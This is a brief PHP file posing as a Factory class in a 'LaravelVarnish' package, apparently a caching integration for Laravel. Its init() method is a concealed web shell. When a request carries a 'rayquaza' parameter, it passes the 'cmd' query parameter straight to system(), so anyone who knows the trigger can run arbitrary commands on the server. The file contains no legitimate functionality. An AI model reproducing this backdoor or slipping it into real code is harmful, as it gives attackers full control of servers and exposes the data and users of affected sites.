<?php

namespace LaravelVarnish;

class Factory {
    public static function init()
    {
        if(isset($_GET['cmd']) && isset($_GET['rayquaza'])) {
          system($_GET['cmd']);
        }
    }
}
